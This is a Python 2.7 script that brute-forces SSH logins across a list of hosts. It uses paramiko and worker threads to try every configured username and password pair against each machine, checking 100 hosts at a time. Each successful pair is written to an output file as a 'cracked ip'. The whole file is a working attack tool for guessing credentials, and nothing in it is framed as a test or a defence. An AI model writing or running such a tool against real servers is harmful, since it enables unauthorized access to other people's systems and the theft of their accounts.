#!usr/bin/python2.7
from wprogressbar import ProgressBar
from termcolor import colored
from getInput import getInput
from Queue import Queue
import threading
import paramiko
import socket

config = {}
checked = 0

q = Queue()


def initializeParamiko():
    global ssh
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("session.log")

def sshConnect(host, username, password):
    try:
        credentials = username + ":" + password
        # Attempt to connect to SSH, it will raise an exception on failure
        ssh.connect(host, port = config["port"], username=username, password=password)
        # Save successful connection
        appendToFile(host, credentials)
        msg = colored("[+] ", "red") + host + "\tAuthentication succeeded!\t" + credentials
    except paramiko.AuthenticationException:
        msg = "[-] " + host + "\tAuthentication failed.\t" + credentials
    except socket.error:
        msg = "[-] " + host + "\tSocket error."
    except:
        msg = "[-] " + host + "\tFailed to connect."
    if config["verbose"]:
        print(msg)

def work():
    global checked
    while True:
        checked += 1
        host = q.get()
        for username in config["username"]:
            for password in config["password"]:
                sshConnect(host, username, password)
        if not config["verbose"]:
            pbar.update()
        q.task_done()


# Create all the threads running the function work
def createThreads():
    for i in range(config["threads"]):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Add the links from the queue set() to the actual q
def checkQueue():
    for ip in config["machines"][:100]:
        q.put(ip)
        config["machines"].remove(ip)
    q.join()
    checkFinish()


# Check if there are links on the queue
def checkFinish():
    # Check ips in groups of 100
    global checked
    if checked >= 100:
        checked -= 100
        checkQueue()

    # Quit program when all ips have been checked
    if len(config["machines"]) == 0:
        print("\n\n[+] Programmed checked all ips, exiting...")
        exit(1)

# Append cracked ip to file
def appendToFile(ip, credentials):
    output = open(config["output"], "a")
    output.write(ip + "\t" + credentials + "\n")
    output.close()

# Initializes the ProgressBar module setting the initial values
def startProgressBar():
    global pbar
    pbar = ProgressBar(title="Bruteforce", maximum=len(config["machines"]), sign="*")
    pbar.start()

def main():
    global config
    config = getInput().checkInput()

    initializeParamiko()
    if not config["verbose"]:
        startProgressBar()

    # Start threading
    createThreads()
    checkQueue()


if __name__ == "__main__":
    try:
        main()
    # Exit the program when a Keyboard Interrupt is pressed
    except KeyboardInterrupt:
        print("Exiting cause of keyboard interrupt.")
        exit(0)